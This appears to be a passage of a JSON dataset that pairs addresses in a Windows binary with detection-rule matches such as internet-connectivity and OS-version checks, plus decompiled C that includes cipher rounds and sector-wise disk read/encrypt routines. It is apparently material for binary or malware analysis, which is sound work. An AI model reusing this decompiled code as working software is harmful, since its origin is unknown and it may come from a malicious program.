uVar6 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x12060) + *((uVar7 & 0xff) * 4 + 0x12460) ^ *((uVar7 >> 0x18) * 4 + 0x12860))\n                    - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = arg2[0x14] ^ uVar8;\n    uVar4 = arg2[0x15] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x12060) - *((uVar7 & 0xff) * 4 + 0x12460)) + *((uVar7 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = uVar6 + arg2[0x12];\n    uVar4 = arg2[0x13] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x12060) ^ *((uVar7 & 0xff) * 4 + 0x12460)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12c60)) - *((uVar7 >> 0x18) * 4 + 0x12860);\n    uVar7 = arg2[0x10] - uVar8;\n    uVar4 = arg2[0x11] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x12060) + *((uVar7 & 0xff) * 4 + 0x12460) ^ *((uVar7 >> 0x18) * 4 + 0x12860))\n                    - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = arg2[0xe] ^ uVar6;\n    uVar4 = arg2[0xf] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x12060) - *((uVar7 & 0xff) * 4 + 0x12460)) + *((uVar7 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = uVar8 + arg2[0xc];\n    uVar4 = arg2[0xd] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ ((*((uVar7 >> 8) * 4 + 0x12060) ^ *((uVar7 & 0xff) * 4 + 0x12460)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12c60)) - *((uVar7 >> 0x18) * 4 + 0x12860);\n    uVar7 = arg2[10] - uVar6;\n    uVar4 = arg2[0xb] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x12060) + *((uVar7 & 0xff) * 4 + 0x12460) ^ *((uVar7 >> 0x18) * 4 + 0x12860))\n                    - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = arg2[8] ^ uVar8;\n    uVar4 = arg2[9] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x12060) - *((uVar7 & 0xff) * 4 + 0x12460)) + *((uVar7 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = uVar6 + arg2[6];\n    uVar4 = arg2[7] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x12060) ^ *((uVar7 & 0xff) * 4 + 0x12460)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12c60)) - *((uVar7 >> 0x18) * 4 + 0x12860);\n    uVar7 = arg2[4] - uVar8;\n    uVar4 = arg2[5] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x12060) + *((uVar7 & 0xff) * 4 + 0x12460) ^ *((uVar7 >> 0x18) * 4 + 0x12860))\n                    - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = arg2[2] ^ uVar6;\n    uVar4 = arg2[3] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x12060) - *((uVar7 & 0xff) * 4 + 0x12460)) + *((uVar7 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar7 = uVar8 + *arg2;\n    uVar4 = arg2[1] & 0x1f;\n    uVar5 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar7 = *((uVar5 & 0xff) * 4 + 0x12460);\n    uVar1 = *((uVar5 >> 8) * 4 + 0x12060);\n    iVar2 = *((uVar5 >> 0x18) * 4 + 0x12860);\n    iVar3 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x12c60);\n    arg1[1] = uVar8;\n    *arg1 = ((uVar7 ^ uVar1) - iVar2) + iVar3 ^ uVar6;\n    return;\n}\n",
        "token_count": 2639
    },
    "0002df48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002df48(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    char *pcVar2;\n    int64_t iVar3;\n    uchar auStack184 [144];\n    \n    if (((arg3 & 0x1ff) == 0) && (arg3 <= *(arg1 * 8 + 0x7a5c0) - 0x200U)) {\n        iVar3 = 0;\n        pcVar2 = arg3 + *(arg1 * 8 + 0x7a5b0);\n        do {\n            if (*pcVar2 != '\\0') {\n                fcn.0002c248(auStack184, 0x10, 0x64df8);\n                fcn.0002bc38(arg3 + *(arg1 * 8 + 0x7a5b0), arg2, 0x200, auStack184);\n                goto code_r0x0002dfb9;\n            }\n            iVar3 = iVar3 + 1;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar3 < 0x200);\n        fcn.00061a56(arg2, 0, 0x200);\ncode_r0x0002dfb9:\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 316
    },
    "0002e350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002e350(void)\n\n{\n    if (*0x7a598 != '\\0') {\n        *0x7a598 = '\\0';\n        *0x7a599 = 1;\n        (*_fcn.00011638)(0x7a5f8, 0, 0);\n        fcn.00031648(0x7a610, 0);\n        fcn.00031624(0x7a610);\n        (*_fcn.00011360)(*0x7a5d0);\n        fcn.00016dd4(*0x7a5d0);\n        *0x7a5d0 = 0;\n        fcn.00061b3a(0xffffffffffffffff, *0x7a5b0);\n        fcn.000619de(*0x7a5a0);\n        fcn.000619de(*0x7a588);\n        *0x7a5b0 = 0;\n        *0x7a5a0 = 0;\n        *0x7a588 = 0;\n        (*_fcn.00011360)(*0x7a5d8);\n        fcn.00016dd4(*0x7a5d8);\n        fcn.00061b3a(0xffffffffffffffff, *0x7a5b8);\n        fcn.000619de(*0x7a5a8);\n        *0x7a5d8 = 0;\n        *0x7a5b8 = 0;\n        *0x7a5a8 = 0;\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "0002e46c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002e46c(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    char cVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iStackX8;\n    uint64_t auStackX16 [3];\n    uchar auStack72 [24];\n    \n    pcVar3 = *(arg1 + 0xb8);\n    if (*(arg1 + 0x44) != '\\0') {\n        return 0xc0000120;\n    }\n    iVar4 = *(arg1 + 8);\n    uVar5 = *(pcVar3 + 0x28) != *0x7a5d0;\n    if (iVar4 == 0) {\n        return 0xc0000001;\n    }\n    if ((*(iVar4 + 10) & 5) == 0) {\n        iStackX8 = (**0x11220)(iVar4, 0, 1, 0, 0, 0x10);\n    }\n    else {\n        iStackX8 = *(iVar4 + 0x18);\n    }\n    if (iStackX8 == 0) {\n        return 0xc000009a;\n    }\n    if (*pcVar3 == '\\x03') {\n        uVar1 = *(pcVar3 + 8);\n        uVar7 = *(pcVar3 + 0x18) >> 0x3f & 0x1ff;\n        if (((*(pcVar3 + 0x18) + uVar7 & 0x1ff) != uVar7) || ((uVar1 & 0x1ff) != 0)) {\n            return 0xc000000d;\n        }\n        uVar7 = 0;\n        if (uVar1 != 0) {\n            uVar2 = *(pcVar3 + 0x18);\n            do {\n                cVar6 = fcn.0002df48(uVar5, uVar7 + iStackX8, uVar2 + uVar7);\n                if (cVar6 == '\\0') break;\n                uVar7 = uVar7 + 0x200;\n            } while (uVar7 < uVar1);\n        }\n        *(arg1 + 0x38) = uVar7;\n    }\n    else {\n        uVar7 = *(pcVar3 + 0x18);\n        auStackX16[0] = *(pcVar3 + 8);\n        uVar8 = uVar7 >> 0x3f & 0x1ff;\n        if ((uVar7 + uVar8 & 0x1ff) != uVar8) {\n            return 0xc000000d;\n        }\n        if ((*(pcVar3 + 8) & 0x1ff) != 0) {\n            return 0xc000000d;\n        }\n        uVar8 = 0;\n        if (auStackX16[0] != 0) {\n            do {\n                cVar6 = fcn.0002de90(uVar5, uVar8 + iStackX8, (uVar7 & 0xffffffff) + uVar8);\n                if (cVar6 == '\\0') break;\n                uVar8 = uVar8 + 0x200;\n            } while (uVar8 < auStackX16[0]);\n        }\n        iStackX8 = (uVar7 & 0xffffffff) + *(uVar5 * 8 + 0x7a5b0);\n        fcn.00061b4c(0xffffffffffffffff, &iStackX8, auStackX16, auStack72);\n        *(arg1 + 0x38) = uVar8;\n    }\n    return 0;\n}\n",
        "token_count": 854
    },
    "0002f718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0002f718(void)\n\n{\n    int32_t aiStackX8 [2];\n    int32_t aiStackX16 [6];\n    \n    if (*0x7a62c != 0) {\n        return *0x7a62c;\n    }\n    fcn.00061b22(aiStackX16, aiStackX8, 0, 0);\n    if (aiStackX16[0] == 5) {\n        if (aiStackX8[0] == 2) {\n            *0x7a62c = 0x12;\n            return 0x12;\n        }\n    }\n    else if (aiStackX16[0] == 6) {\n        if (aiStackX8[0] == 0) {\n            *0x7a62c = 0x26;\n            return 0x26;\n        }\n        if (aiStackX8[0] == 1) {\n            *0x7a62c = 0x2e;\n            return 0x2e;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "0002f814": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002f814(char *arg1, ulong *arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int64_t arg3_00;\n    uint16_t *puVar8;\n    uint32_t *apuStackX8 [4];\n    \n    if (arg1 != NULL) {\n        if (arg2 == NULL) {\n            return 0x21590066;\n        }\n        if (arg3 == NULL) {\n            return 0x21590067;\n        }\n        cVar5 = *arg1;\n        pcVar3 = NULL;\n        pcVar6 = arg1;\n        if (cVar5 != '\\0') {\n            do {\n                if (cVar5 == '.') {\n                    pcVar3 = pcVar6;\n                }\n                pcVar6 = pcVar6 + 1;\n                cVar5 = *pcVar6;\n            } while (cVar5 != '\\0');\n            if (pcVar3 != NULL) {\n                arg3_00 = 0;\n                do {\n                    arg3_00 = arg3_00 + 1;\n                } while (arg1[arg3_00] != '\\0');\n                uVar4 = fcn.0002f490(0xb, apuStackX8);\n                if (uVar4 != 0) {\n                    return uVar4;\n                }\n                uVar7 = 0;\n                uVar4 = 0x21590005;\n                uVar1 = *apuStackX8[0];\n                if (uVar1 != 0) {\n                    puVar8 = apuStackX8[0] + 0x2e;\n                    do {\n                        if ((((uVar7 == 0) && (iVar2 = fcn.0002f784(arg1, 0x11c98, arg3_00),  iVar2 == 0)) ||\n                            ((uVar7 == 1 && (iVar2 = fcn.0002f784(arg1, 0x140c0, arg3_00),  iVar2 == 0)))) ||\n                           (iVar2 = fcn.0002f784(apuStackX8[0] + *puVar8 + uVar7 * 0x128 + 0x30, arg1, arg3_00), \n                           iVar2 == 0)) {\n                            uVar4 = 0;\n                            *arg2 = *(apuStackX8[0] + uVar7 * 0x4a + 6);\n                            *arg3 = apuStackX8[0][uVar7 * 0x4a + 8];\n                            break;\n                        }\n                        uVar7 = uVar7 + 1;\n                        puVar8 = puVar8 + 0x94;\n                    } while (uVar7 < uVar1);\n                }\n                fcn.0002fc50(apuStackX8[0]);\n                return uVar4;\n            }\n        }\n    }\n    return 0x21590065;\n}\n",
        "token_count": 698
    },
    "0002f980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0002f980(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint uVar7;\n    int32_t iVar8;\n    int64_t iStack112;\n    uchar auStack104 [56];\n    \n    iVar6 = 0;\n    iVar4 = 0;\n    bVar1 = false;\n    iVar8 = 0;\n    if (arg4 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar7 = 0;\n        uVar2 = (*_fcn.00011138)(noname_0, 0, 0, 0, &iStack112, 0, 0, 0, 0);\n        if (-1 < uVar2) {\n            iVar3 = (*_fcn.000113b8)();\n            if (iStack112 == iVar3) {\n                uVar5 = 0;\n                if (in_stack_00000030 == 0) {\n                    fcn.000619f6(arg2, arg3, arg4);\n                }\n                else {\n                    fcn.000619f6(arg3, arg2, arg4);\n                }\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = arg4;\n                }\n            }\n            else {\n                uVar2 = 0;\n                iVar4 = (**0x11128)(arg3, arg4, 0, 0, 0);\n                if (iVar4 == 0) {\n                    uVar5 = 0xc000009a;\n                    iVar6 = 0;\n                }\n                else {\n                    (**0x113b0)(iStack112, auStack104);\n                    bVar1 = true;\n                    (**0x11120)(iVar4, 0, in_stack_00000030 != 0);\n                    iVar8 = 1;\n                    iVar6 = (**0x11220)(iVar4, 0, 1, 0, uVar2 & 0xffffffff00000000, CONCAT44(uVar7, 0x10));\n                    if (iVar6 == 0) {\n                        uVar5 = 0xc000009a;\n                    }\n                    else {\n                        if (in_stack_00000030 == 0) {\n                            fcn.000619f6(arg2, iVar6, arg4);\n                        }\n                        else {\n                            fcn.000619f6(iVar6, arg2, arg4);\n                        }\n                        uVar5 = 0;\n                    }\n                }\n            }\n            if (iVar6 != 0) {\n                (**0x11228)(iVar6, iVar4);\n            }\n            if (iVar8 != 0) {\n                (**0x11118)(iVar4);\n            }\n            if (bVar1) {\n                (**0x113a8)(auStack104);\n            }\n            if (iVar4 != 0) {\n                (**0x11110)(iVar4);\n            }\n            (*_fcn.000115b0)(iStack112);\n            uVar2 = uVar5;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 745
    },
    "00030254": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00030254(int16_t *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    bool bVar5;\n    \n    bVar5 = arg3 == 0;\n    while( true ) {\n        if (bVar5) {\n            return 0;\n        }\n        iVar1 = fcn.00061b76(*arg1);\n        iVar2 = fcn.00061b76();\n        if (iVar1 != iVar2) break;\n        if (*arg1 == 0) {\n            return 0;\n        }\n        arg1 = arg1 + 1;\n        arg2 = arg2 + 1;\n        arg3 = arg3 + -1;\n        bVar5 = arg3 == 0;\n    }\n    uVar3 = fcn.00061b76(*arg1);\n    uVar4 = fcn.00061b76(*arg2);\n    return uVar3 - uVar4;\n}\n",
        "token_count": 239
    },
    "0003034c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003034c(int16_t *arg1, ulong arg2, int16_t *arg3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t arg2_00;\n    int16_t *piVar4;\n    \n    arg2_00 = arg2;\n    if (*arg3 == 0x5c) {\n        fcn.00061a3e(arg1, arg3, arg2_00);\n    }\n    else {\n        if ((*arg3 != 0) && (arg3[1] == 0x3a)) {\n            uVar2 = fcn.00061a0e(arg1, arg2_00, 0x14150, arg3);\n            if ((-1 < uVar2) && (uVar2 != arg2)) {\n                return;\n            }\n            arg1[arg2 - 1] = 0;\n            return;\n        }\n        fcn.000284e8(arg1, arg2_00);\n        uVar3 = 0xffffffffffffffff;\n        piVar4 = arg1;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        fcn.00061ab0(arg1, arg3, arg2_00 - (~uVar3 - 1));\n    }\n    arg1[arg2 - 1] = 0;\n    return;\n}\n",
        "token_count": 352
    },
    "00030e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00030e70(ulong arg1, uchar *arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t aiStackX16 [2];\n    ulong uStackX32;\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0;\n    }\n    if (*0x7afd0 == 0) {\n        iVar1 = (*_fcn.00011210)(&uStackX32, 0, 0, 0, 0, 0x30e20, 0x7afd0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00061aa4(uStackX32, 0, 0);\n        fcn.000619de(uStackX32);\n        if (*0x7afd0 == 0) {\n            *arg2 = 0;\n            return 0;\n        }\n    }\n    if (arg1 == 0) {\n        aiStackX16[0] = (*_fcn.000113b8)();\n    }\n    else {\n        iVar1 = (*_fcn.000113f0)(arg1, aiStackX16);\n        if (iVar1 != 0) {\n            return 0;\n        }\n    }\n    fcn.00061b0a(arg2, *0x7afd0 + aiStackX16[0], arg3);\n    arg2[arg3 + -1] = 0;\n    if (arg1 != 0) {\n        (*_fcn.000115b0)(aiStackX16[0]);\n    }\n    return 1;\n}\n",
        "token_count": 370
    },
    "00031088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00031088(int32_t *arg1)\n\n{\n    bool bVar1;\n    \n    (*_fcn.00011628)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    if ((arg1[1] < 1) && (arg1[2] != -1)) {\n        bVar1 = false;\n        arg1[2] = arg1[2] + 1;\n    }\n    else {\n        bVar1 = true;\n        *arg1 = *arg1 + 1;\n    }\n    (**0x11388)(*(arg1 + 4) + 0x40, 0);\n    if (bVar1) {\n        (*_fcn.00011628)(*(arg1 + 4), 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "000314ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000314ec(int64_t *arg1, ulong arg2)\n\n{\n    if (arg2 == 0) {\n        LOCK();\n        *arg1 = *arg1 + -1;\n        return;\n    }\n    if (arg2 == 1) {\n        LOCK();\n        arg1[1] = arg1[1] + -1;\n        return;\n    }\n    if (arg2 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + -1;\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00031598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00031598(int64_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    if (arg3 == 0) {\n        LOCK();\n        *arg1 = *arg1 + -1;\n    }\n    else if (arg3 == 1) {\n        LOCK();\n        arg1[1] = arg1[1] + -1;\n    }\n    else if (arg3 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + -1;\n    }\n    if (*arg2 < 2) {\n        (*_fcn.000111e0)(*arg2);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00031740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00031740(char *arg1, int64_t arg2, int64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uint32_t auStackX24 [4];\n    \n    if (arg3 != 0) {\n        iVar3 = -1;\n        pcVar4 = arg1;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = fcn.00061ba0(arg2, arg3 * 2 + -2, auStackX24, arg1, ~iVar3 - 1);\n        if (iVar2 == 0) {\n            *(auStackX24[0] + arg2) = 0;\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 228
    },
    "0003179c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003179c(int16_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint32_t auStackX24 [4];\n    \n    if (arg3 != 0) {\n        iVar3 = -1;\n        piVar4 = arg1;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iVar2 = fcn.00061ba6(arg2, arg3 + -1, auStackX24, arg1, (~iVar3 - 1) * 2);\n        if (iVar2 == 0) {\n            *(auStackX24[0] + arg2) = 0;\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 233
    },
    "00033884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00033884(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    uint64_t uVar1;\n    ulong uVar2;\n    ulong unaff_RBX;\n    int64_t *arg3;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4;\n    int64_t *piVar3;\n    ulong unaff_R12;\n    int64_t arg2_00;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000014;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    \n    arg3 = NULL;\n    if (arg2 == 0) {\n        uVar1 = *0x7b3c4;\n        arg2_00 = 0x3302c;\n    }\n    else if (arg2 == 2) {\n        uVar1 = *0x7b3cc;\n        arg2_00 = 0x33104;\n    }\n    else if (arg2 == 3) {\n        uVar1 = *0x7b3a4;\n        arg2_00 = 0x33630;\n    }\n    else {\n        if (arg2 != 4) {\n            return 0;\n        }\n        uVar1 = *0x7b3a8;\n        arg2_00 = 0x336f8;\n    }\n    arg1_00 = *(uVar1 + arg1);\n    if ((arg1_00 != 0) && (arg2_00 != 0)) {\n        arg4 = &stack0x00000010;\n        uVar2 = fcn.00051574(arg1_00, 0x50, 5, arg4);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        if (4 < in_stack_00000010) {\n            fcn.00031564(0x7b1c0, &stack0x00000018, 1);\n            piVar3 = *0x7b1d8;\n            if (*0x7b1d8 != NULL) {\n                do {\n                    if (piVar3[1] == arg1) break;\n                    piVar3 = *piVar3;\n                } while (piVar3 != NULL);\n                if (piVar3 != NULL) {\n                    if (arg2 == 0) {\n                        arg3 = piVar3 + 3;\n                    }\n                    else if (arg2 == 2) {\n                        arg3 = piVar3 + 4;\n                    }\n                    else if (arg2 == 3) {\n                        arg3 = piVar3 + 6;\n                    }\n                    else if (arg2 == 4) {\n                        arg3 = piVar3 + 5;\n                    }\n                }\n            }\n            fcn.00031598(0x7b1c0, &stack0x00000018, 1);\n            uVar2 = fcn.00051f30(arg1_00, arg2_00, arg3, arg4, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                 in_stack_00000000, in_stack_00000008, CONCAT44(in_stack_00000014, in_stack_00000010), \n                                 in_stack_00000018, in_stack_00000020, in_stack_00000028, in_stack_00000030, \n                                 in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                 in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 954
    },
    "000359b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000359b0(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uchar uStack280;\n    uchar uStack279;\n    ushort uStack278;\n    int32_t iStack276;\n    uint uStack272;\n    uint uStack248;\n    ulong uStack240;\n    uint32_t uStack228;\n    \n    if (arg2 == 0) {\n        iVar1 = -0x3ffffff3;\n    }\n    else {\n        fcn.00061b2e(&uStack280, 0xf0);\n        uStack280 = 0x96;\n        uStack279 = 1;\n        uStack278 = 0xf0;\n        uStack272 = 0;\n        if ((arg1 == 0) || (arg1 == 1)) {\n            uStack248 = arg3;\n            uStack240 = arg4;\n        }\n        iStack276 = arg1;\n        iVar1 = (**0x7b028)(arg2);\n        if (iVar1 == 0x103) {\n            iVar1 = fcn.000358d0(arg2, 0);\n        }\n        if (((iVar1 == 0) && (in_stack_00000030 != NULL)) &&\n           (*in_stack_00000030 = uStack228,  in_stack_00000028 < uStack228)) {\n            *in_stack_00000030 = in_stack_00000028;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 357
    },
    "00035c0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
